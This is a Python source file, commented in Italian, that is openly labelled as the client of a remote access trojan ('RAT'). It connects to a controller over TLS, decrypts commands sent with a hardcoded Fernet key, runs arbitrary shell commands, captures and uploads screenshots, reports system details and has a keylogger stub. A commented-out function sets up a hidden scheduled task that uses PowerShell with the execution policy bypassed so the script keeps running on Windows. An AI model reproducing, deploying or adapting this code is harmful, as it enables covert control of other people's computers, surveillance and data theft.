import os
import socket
import ssl
import argparse
import io
import platform
import shlex
from PIL import ImageGrab  # serve Pillow
from cryptography.fernet import Fernet
import subprocess
from pathlib import Path
import sys

# Chiave Fernet condivisa con il server
FERNET_KEY = b'2q7UuYx7ep2xJZL-G6fJ0X4Oq9c0xv7Q0i0n2c8pN7o='
fernet = Fernet(FERNET_KEY)

DELIM = b"#@JEBUN@#"

# Configurazione percorsi certificati
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CERT_DIR = os.path.join(BASE_DIR, "certs")

# Variabile globale per mantenere la directory corrente
CURRENT_DIR = os.getcwd()

'''
def task_windows(task_name: str = "KeepMyScriptRunning", interval_minutes: int = 1) -> None:
    """
    Create/replace a Windows Scheduled Task that keeps THIS .py script running.

    - Detects if this script is already running (by command line)
    - If not, starts: python.exe <this_script.py>
    """
    script_path = Path(__file__).resolve()
    python_exe = Path(sys.executable).resolve()

    local_appdata = os.environ.get("LOCALAPPDATA")
    if not local_appdata:
        raise RuntimeError("LOCALAPPDATA env var not found. Are you on Windows?")

    monitor_dir = Path(local_appdata) / "ProcessMonitor"
    monitor_dir.mkdir(parents=True, exist_ok=True)

    monitor_script = monitor_dir / f"Monitor-{script_path.stem}.ps1"
    log_path = monitor_dir / f"Monitor-{script_path.stem}.log"

    monitor_script_content = f"""
$ErrorActionPreference = 'Continue'
$scriptPath = '{script_path}'
$pythonExe = '{python_exe}'
$logPath = '{log_path}'

function Write-Log([string]$msg) {{
    "$(Get-Date -Format o)  $msg" | Add-Content -Path $logPath
}}

Write-Log "Monitor start"

try {{
    $procs = Get-CimInstance Win32_Process -Filter "Name = 'python.exe'" |
        Where-Object {{ $_.CommandLine -like "*$scriptPath*" }}

    if ($procs) {{
        Write-Log "Script already running (PID(s): $($procs.ProcessId -join ', '))"
    }} else {{
        Write-Log "Script not running. Starting."
        # IMPORTANT: only pass the script path to python.exe, no PowerShell switches
        Start-Process -FilePath $pythonExe -ArgumentList @('{script_path}') | Out-Null
        Write-Log "Start-Process issued."
    }}
}}
catch {{
    Write-Log "ERROR: $($_.Exception.Message)"
}}
""".strip()

    monitor_script.write_text(monitor_script_content, encoding="utf-8")

    # Delete existing task if present
    subprocess.run(
        ["schtasks", "/Delete", "/TN", task_name, "/F"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )

    # Create scheduled task: every N minutes, run the monitor script
    subprocess.check_call(
        [
            "schtasks",
            "/Create",
            "/SC", "MINUTE",
            "/MO", str(interval_minutes),
            "/TN", task_name,
            "/TR",
            f'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{monitor_script}"',
            "/RL", "LIMITED",
            "/F",
        ]
    )

    print(f"Task '{task_name}' created.")
    print(f"Monitoring script: {script_path}")
    print(f"Monitor PS script: {monitor_script}")
    print(f"Log file: {log_path}")
    print(f"Interval: every {interval_minutes} minute(s)")

'''

def encode_message(text: str) -> bytes:
    """
    Codifica una stringa con Fernet + delimitatore.
    """
    raw = text.encode("utf-8")
    encrypted = fernet.encrypt(raw)
    return encrypted + DELIM


def encode_message_bytes(data: bytes) -> bytes:
    """
    Codifica bytes (es. screenshot) con Fernet + delimitatore.
    """
    encrypted = fernet.encrypt(data)
    return encrypted + DELIM


def decode_stream(buffer: bytes):
    """
    Estrae messaggi completi (encrypted + DELIM) dal buffer.
    Ritorna (lista_messaggi_decodificati, buffer_residuo).
    """
    messages = []

    while True:
        idx = buffer.find(DELIM)
        if idx == -1:
            break

        payload = buffer[:idx]
        buffer = buffer[idx + len(DELIM):]

        if not payload:
            messages.append("")
            continue

        try:
            decoded_bytes = fernet.decrypt(payload)
            decoded_str = decoded_bytes.decode("utf-8", errors="ignore")
            messages.append(decoded_str)
        except Exception as e:
            print(f"[CLIENT] Error decrypting message: {e}")
            continue

    return messages, buffer


def get_sysinfo_string() -> str:
    """
    Raccoglie informazioni sul sistema.
    """
    parts = [
        f"System: {platform.system()}",
        f"Node: {platform.node()}",
        f"Release: {platform.release()}",
        f"Version: {platform.version()}",
        f"Machine: {platform.machine()}",
        f"Processor: {platform.processor()}",
        f"Current Directory: {os.getcwd()}",
    ]
    return "\n".join(parts)


def get_shell(cmd: str) -> str:
    """
    Esegue un comando shell, gestendo correttamente il comando 'cd'.
    """
    global CURRENT_DIR

    toexecute = cmd.strip()
    if not toexecute:
        return ""

    # Gestione speciale per il comando 'cd'
    try:
        cmd_parts = shlex.split(toexecute)
    except ValueError as exc:
        return f"Error parsing command: {exc}"
    if not cmd_parts:
        return ""
    if cmd_parts[0] == "cd":
        if len(cmd_parts) == 1:
            # 'cd' senza argomenti -> vai alla home
            try:
                home_dir = os.path.expanduser("~")
                os.chdir(home_dir)
                CURRENT_DIR = os.getcwd()
                return f"Changed directory to: {CURRENT_DIR}"
            except Exception as e:
                return f"Error changing to home directory: {e}"
        else:
            # 'cd <path>'
            target_path = cmd_parts[1]
            try:
                # Gestisci path relativi e assoluti
                if not os.path.isabs(target_path):
                    target_path = os.path.join(CURRENT_DIR, target_path)

                # Normalizza il path (risolve .., ., etc.)
                target_path = os.path.normpath(target_path)

                # Verifica che la directory esista
                if not os.path.exists(target_path):
                    return f"Error: Directory does not exist: {target_path}"

                if not os.path.isdir(target_path):
                    return f"Error: Not a directory: {target_path}"

                # Cambia directory
                os.chdir(target_path)
                CURRENT_DIR = os.getcwd()
                return f"Changed directory to: {CURRENT_DIR}"

            except PermissionError:
                return f"Error: Permission denied: {target_path}"
            except Exception as e:
                return f"Error changing directory: {e}"

    # Per tutti gli altri comandi, usa subprocess
    try:
        # Esegui il comando dalla directory corrente
        shell_executable = "/bin/bash" if os.name == "posix" else None
        result = subprocess.run(
            toexecute,
            shell=True,
            capture_output=True,
            text=True,
            cwd=CURRENT_DIR,  # Importante: esegui dalla directory corrente
            executable=shell_executable,
        )

        stdout = result.stdout or ""
        stderr = result.stderr or ""

        if stdout or stderr:
            output_parts = []
            if stdout:
                output_parts.append(stdout)
            if stderr:
                output_parts.append(f"\n[stderr]\n{stderr}")
            return "".join(output_parts).strip()
        else:
            # Comando eseguito senza output
            if result.returncode == 0:
                return ""  # Successo silenzioso
            else:
                return f"Command exited with code {result.returncode}"

    except FileNotFoundError:
        return f"Error: Command not found: {cmd_parts[0]}"
    except Exception as e:
        return f"Error executing command: {e}"


def capture_screenshot_bytes() -> bytes:
    """
    Cattura uno screenshot e lo restituisce come bytes PNG.
    """
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def handle_command(sock: ssl.SSLSocket, cmd: str):
    """
    Gestisce un comando ricevuto dal server e manda la risposta.
    """
    print(f"[CLIENT] Received command: {repr(cmd)}")

    if cmd.startswith("sysinfo"):
        info = get_sysinfo_string()
        print("[CLIENT] Sending sysinfo back to server")
        sock.sendall(encode_message(info))

    elif cmd.startswith("screenshot"):
        print("[CLIENT] Capturing screenshot...")
        try:
            img_bytes = capture_screenshot_bytes()
            print(f"[CLIENT] Screenshot size: {len(img_bytes)} bytes, sending...")
            sock.sendall(encode_message_bytes(img_bytes))
        except Exception as e:
            error_msg = f"[CLIENT] Error capturing screenshot: {e}"
            print(error_msg)
            sock.sendall(encode_message(error_msg))

    elif cmd.startswith("shell"):
        # Estrai il comando shell
        parts = cmd.split(":", 1)

        if len(parts) == 2:
            shell_cmd = parts[1].strip()
        else:
            shell_cmd = ""

        print(f"[CLIENT] Received shell request: {repr(shell_cmd)}")

        if shell_cmd:
            # USA LA FUNZIONE get_shell invece di duplicare il codice!
            resp = get_shell(shell_cmd)

            # Se la risposta è vuota, invia un messaggio di conferma
            if not resp:
                resp = "[Command executed successfully]"
        else:
            resp = "[CLIENT] Error: shell command is empty"

        sock.sendall(encode_message(resp))

    elif cmd.startswith("keylogger"):
        resp = "[CLIENT] keylogger not implemented in this client"
        sock.sendall(encode_message(resp))

    else:
        resp = f"[CLIENT] Unknown command: {cmd}"
        sock.sendall(encode_message(resp))


def client_main(host: str, port: int, verify_cert: bool = False):
    """
    Connessione client con SSL/TLS.

    Args:
        host: indirizzo del server
        port: porta del server
        verify_cert: se True, verifica il certificato del server (richiede CA cert)
    """
    global CURRENT_DIR

    # Crea contesto SSL per il client
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)

    if verify_cert:
        # Modalità sicura: verifica il certificato del server
        context.check_hostname = False
        context.verify_mode = ssl.CERT_REQUIRED
        # Carica il certificato della CA che ha firmato il server
        ca_cert_path = os.path.join(CERT_DIR, "ca.crt")
        if os.path.exists(ca_cert_path):
            context.load_verify_locations(ca_cert_path)
        else:
            print(f"[CLIENT] Warning: CA certificate not found at {ca_cert_path}")
    else:
        # Modalità insicura: accetta qualsiasi certificato (solo per test!)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        print("[CLIENT] Warning: Certificate verification disabled!")

    # Crea socket normale
    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print(f"[CLIENT] Connecting to {host}:{port} with SSL/TLS...")
    print(f"[CLIENT] Starting directory: {CURRENT_DIR}")

    try:
        # Wrap del socket con SSL
        with context.wrap_socket(raw_sock, server_hostname=host if verify_cert else None) as sock:
            sock.connect((host, port))
            print("[CLIENT] Connected with SSL/TLS.")
            print(f"[CLIENT] Cipher: {sock.cipher()}")
            print(f"[CLIENT] Protocol: {sock.version()}")

            buffer = b""

            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        print("[CLIENT] Server closed connection.")
                        break

                    buffer += chunk
                    messages, buffer = decode_stream(buffer)

                    for msg in messages:
                        handle_command(sock, msg)

            except KeyboardInterrupt:
                print("\n[CLIENT] Interrupted by user.")
            except ssl.SSLError as e:
                print(f"[CLIENT] SSL Error: {e}")
            except Exception as e:
                print(f"[CLIENT] Error: {e}")
            finally:
                print("[CLIENT] Closing connection...")

    except ConnectionRefusedError:
        print(f"[CLIENT] Connection refused. Is the server running on {host}:{port}?")
    except ssl.SSLError as e:
        print(f"[CLIENT] SSL connection failed: {e}")
    except Exception as e:
        print(f"[CLIENT] Connection error: {e}")


if __name__ == "__main__":
    #task_windows()
    parser = argparse.ArgumentParser(description="SSL/TLS Client for RAT server")
    parser.add_argument("-a", "--address", default="127.0.0.1", help="Server address")
    parser.add_argument("-p", "--port", type=int, default="4444", help="Server port")
    parser.add_argument(
        "--verify-cert",
        action="store_true",
        help="Enable certificate verification (requires ca.crt in certs/)"
    )
    args = parser.parse_args()

    client_main(args.address, args.port, args.verify_cert)
